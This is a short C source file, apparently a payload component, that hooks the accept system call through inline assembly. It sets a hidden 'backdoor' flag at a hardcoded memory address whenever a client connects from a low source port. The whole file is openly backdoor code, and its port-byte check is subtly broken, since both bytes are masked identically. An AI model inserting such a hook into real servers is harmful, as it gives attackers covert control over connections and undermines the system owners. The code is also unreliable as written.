#include <netinet/in.h>
#include <stdint.h>

uint32_t *get_backdoor_location ();

int sys_accept (int fd, struct sockaddr *restrict addr,
                socklen_t *restrict addr_len);

int
accept_hook (int fd, struct sockaddr *restrict addr,
             socklen_t *restrict addr_len)
{
  int ret_fd = sys_accept (fd, addr, addr_len);
  uint32_t *backdoor_flag = get_backdoor_location ();
  uint8_t high_port = ((struct sockaddr_in *)addr)->sin_port & 0xff;
  uint8_t low_port = ((struct sockaddr_in *)addr)->sin_port & 0x00ff;
  if (!high_port && (low_port <= 33))
    *backdoor_flag = 16;
  else
    *backdoor_flag = 0;
  return ret_fd;
}

uint32_t *
get_backdoor_location ()
{
  asm ("mov rax, 0x123456789abc");
}

int
sys_accept (int fd, struct sockaddr *restrict addr,
            socklen_t *restrict addr_len)
{
  asm ("push 0x2b; pop rax; syscall");
}

void
_start ()
{
}
